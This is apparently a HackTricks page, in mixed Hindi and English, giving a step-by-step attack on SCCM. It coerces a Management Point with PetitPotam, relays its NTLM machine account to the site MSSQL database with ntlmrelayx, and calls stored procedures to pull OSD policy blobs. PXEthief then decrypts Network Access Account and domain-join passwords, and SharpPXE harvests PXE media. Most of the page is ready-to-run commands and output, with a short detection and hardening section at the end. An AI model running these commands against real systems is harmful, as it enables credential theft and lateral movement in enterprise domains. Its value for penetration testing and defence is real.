# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
एक **System Center Configuration Manager (SCCM) Management Point (MP)** को SMB/RPC पर authenticate करने के लिए बाध्य करके और उस NTLM machine account को **site database (MSSQL)** पर **relaying** करने से आपको `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights मिलते हैं। ये roles आपको stored procedures के एक सेट को call करने देते हैं, जो **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables आदि) expose करते हैं। ये blobs hex-encoded/encrypted होते हैं, लेकिन **PXEthief** से इन्हें decode और decrypt किया जा सकता है, जिससे plaintext secrets प्राप्त होते हैं।

High-level chain:
1. MP और site DB खोजें ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`।
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` शुरू करें।
3. **PetitPotam**, PrinterBug, DFSCoerce आदि का उपयोग करके MP को coerce करें।
4. SOCKS proxy के माध्यम से relayed **<DOMAIN>\\<MP-host>$** account के रूप में `mssqlclient.py -windows-auth` से connect करें।
5. Execute करें:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (या `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM हटाएँ, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`।

`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` आदि secrets, PXE या clients को access किए बिना recover किए जाते हैं।<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Unauthenticated MP endpoints की Enumeration
MP ISAPI extension **GetAuth.dll** कई ऐसे parameters expose करता है जिनके लिए authentication आवश्यक नहीं होती (जब तक site केवल PKI का उपयोग न करती हो):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | site signing cert public key और *x86* / *x64* **All Unknown Computers** devices के GUIDs return करता है। |
| `MPLIST` | site के प्रत्येक Management-Point की list देता है। |
| `SITESIGNCERT` | Primary-Site signing certificate return करता है (LDAP के बिना site server की पहचान करें)। |

वे GUIDs प्राप्त करें जो बाद की DB queries के लिए **clientID** के रूप में काम करेंगे:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP machine account को MSSQL पर Relay करें
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
जब coercion fire होता है, तो आपको कुछ ऐसा दिखाई देना चाहिए:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. stored procedures के माध्यम से OSD policies की पहचान करें
SOCKS proxy (डिफ़ॉल्ट रूप से port 1080) के माध्यम से connect करें:<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB पर स्विच करें (3-अंकीय site code का उपयोग करें, जैसे `CM_001`)।

### 3.1  Unknown-Computer GUIDs खोजें (वैकल्पिक)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  असाइन की गई नीतियों की सूची
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
प्रत्येक row में `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion` शामिल होते हैं।

इन policies पर ध्यान दें:
* **NAAConfig** – Network Access Account credentials
* **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
* **CollectionSettings** – इसमें run-as accounts हो सकते हैं

### 3.3 पूर्ण body प्राप्त करें
यदि आपके पास पहले से `PolicyID` और `PolicyVersion` हैं, तो आप इसका उपयोग करके clientID की आवश्यकता को छोड़ सकते हैं:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> महत्वपूर्ण: SSMS में “Maximum Characters Retrieved” को बढ़ाएँ (>65535), अन्यथा blob truncate हो जाएगा।

---

## 4. Decode & decrypt the blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
पुनर्प्राप्त secrets का उदाहरण:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevant SQL roles & procedures
Relay के बाद login को निम्न roles में map किया जाता है:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

ये roles दर्जनों EXEC permissions प्रदान करते हैं, इस attack में उपयोग किए जाने वाले मुख्य permissions हैं:

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | किसी `clientID` पर लागू policies की सूची बनाता है। |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | पूरी policy body लौटाता है। |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` path द्वारा लौटाया जाता है। |

आप पूरी सूची इस प्रकार inspect कर सकते हैं:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **UDP/4011 पर PXE reply**: PXE के लिए configured Distribution Point को PXE boot request भेजें। proxyDHCP response में `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) और `SMSBoot\\x64\\pxe\\boot.bcd` जैसे boot paths, साथ ही एक optional encrypted key blob दिखाई देता है।<sup>[[4]](#references)</sup>
* **TFTP के माध्यम से boot artifacts प्राप्त करें**: प्राप्त paths का उपयोग करके `variables.dat` को TFTP से download करें (unauthenticated)। यह file छोटी (कुछ KB) होती है और इसमें encrypted media variables होती हैं।
* **Decrypt या crack करें**:
- यदि response में decryption key शामिल है, तो `variables.dat` को सीधे decrypt करने के लिए उसे **SharpPXE** में feed करें।
- यदि key प्रदान नहीं की गई है (PXE media custom password से protected है), तो SharpPXE offline cracking के लिए **Hashcat-compatible** `$sccm$aes128$...` hash generate करता है। Password recover करने के बाद file को decrypt करें।
* **Decrypted XML को parse करें**: plaintext variables में SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUIDs और अन्य identifiers) होते हैं। SharpPXE इन्हें parse करता है और follow-on abuse के लिए GUID/PFX/site parameters से prefilled, ready-to-run **SharpSCCM** command print करता है।
* **Requirements**: केवल PXE listener (UDP/4011) और TFTP तक network reachability आवश्यक है; local admin privileges की जरूरत नहीं है।

---

## 7. Detection & Hardening
1. **MP logins को monitor करें** – किसी ऐसे IP से MP computer account का login करना जो उसके host का IP नहीं है, लगभग निश्चित रूप से relay है।<sup>[[1]](#references)</sup>
2. Site database (`PREVENT-14`) पर **Extended Protection for Authentication (EPA)** enable करें।
3. Unused NTLM को disable करें, SMB signing enforce करें, RPC को restrict करें (\
`PetitPotam`/`PrinterBug` के विरुद्ध उपयोग किए जाने वाले समान mitigations)।
4. IPSec / mutual-TLS के साथ MP ↔ DB communication को harden करें।
5. **PXE exposure को constrain करें** – UDP/4011 और TFTP को trusted VLANs तक firewall करें, PXE passwords required करें और `SMSBoot\\*\\pxe\\variables.dat` के TFTP downloads पर alert करें।<sup>[[4]](#references)</sup>

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
